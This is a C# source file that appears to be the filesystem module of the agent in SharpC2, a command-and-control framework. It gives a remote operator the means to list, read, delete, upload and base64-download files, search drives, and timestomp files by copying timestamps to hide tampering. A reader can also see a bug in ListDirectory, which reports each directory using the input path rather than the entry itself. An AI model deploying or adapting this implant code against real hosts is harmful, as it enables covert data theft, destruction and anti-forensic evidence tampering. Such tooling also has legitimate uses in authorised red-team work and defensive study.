using Agent.Models;

using System;
using System.IO;

namespace Agent
{
    class Filesystem
    {
        public static string ListDirectory(string directory)
        {
            var path = string.IsNullOrEmpty(directory) ? Directory.GetCurrentDirectory() : directory;
            var result = new SharpC2ResultList<FileSystemEntryResult>();

            foreach (var dir in Directory.GetDirectories(path))
            {
                var info = new DirectoryInfo(directory);
                result.Add(new FileSystemEntryResult
                {
                    Size = string.Empty,
                    Type = "dir",
                    LastModified = info.LastWriteTimeUtc,
                    Name = info.Name
                });
            }

            foreach (var file in Directory.GetFiles(path))
            {
                var info = new FileInfo(file);
                result.Add(new FileSystemEntryResult
                {
                    Size = Helpers.ConvertFileLength(info.Length),
                    Type = "fil",
                    LastModified = info.LastWriteTimeUtc,
                    Name = info.Name
                });
            }

            return result.ToString();
        }

        public static string PrintWorkingDirectory()
        {
            var result = Directory.GetCurrentDirectory();
            return result;
        }

        public static string ChangeDirectory(string directory)
        {
            Directory.SetCurrentDirectory(directory);
            return PrintWorkingDirectory();
        }

        public static string CreateDirectory(string path)
        {
            var directory = Directory.CreateDirectory(path);
            return directory.FullName;
            
        }

        public static void RemoveDirectory(string directory)
        {
            Directory.Delete(directory, true);
        }

        public static void RemoveFile(string path)
        {
            File.Delete(path);
        }

        public static string ReadFile(string path)
        {
            return File.ReadAllText(path);
        }

        public static void CopyFile(string source, string destination)
        {
            File.Copy(source, destination, true);
        }

        public static void MoveFile(string source, string destination)
        {
            File.Move(source, destination);
        }

        public static void UploadFile(string path, byte[] data)
        {
            File.WriteAllBytes(path, data);
        }

        public static string DownloadFile(string path)
        {
            var data = File.ReadAllBytes(path);
            return Convert.ToBase64String(data);
        }

        public static void ChangeFileTimestamp(string source, string target)
        {
            var sourceInfo = new FileInfo(source);

            File.SetCreationTime(target, sourceInfo.CreationTime);
            File.SetCreationTimeUtc(target, sourceInfo.CreationTimeUtc);

            File.SetLastWriteTime(target, sourceInfo.LastWriteTime);
            File.SetLastWriteTimeUtc(target, sourceInfo.LastWriteTimeUtc);

            File.SetLastAccessTime(target, sourceInfo.LastAccessTime);
            File.SetLastAccessTimeUtc(target, sourceInfo.LastAccessTimeUtc);
        }

        public static string SearchForFile(string path, string pattern)
        {
            var files = Directory.GetFiles(path, pattern, SearchOption.AllDirectories);
            return string.Join("\n", files);
        }

        public static string GetDrives()
        {
            var result = new SharpC2ResultList<DriveInfoResult>();
            var drives = DriveInfo.GetDrives();

            foreach (var drive in drives)
            {
                var info = new DriveInfoResult
                {
                    Name = drive.Name,
                    Type = drive.DriveType
                };

                if (drive.IsReady)
                {
                    info.Label = drive.VolumeLabel;
                    info.Format = drive.DriveFormat;
                    info.Capacity = Helpers.ConvertFileLength(drive.TotalSize);
                    info.FreeSpace = Helpers.ConvertFileLength(drive.AvailableFreeSpace);
                }

                result.Add(info);
            }

            return result.ToString();
        }
    }
}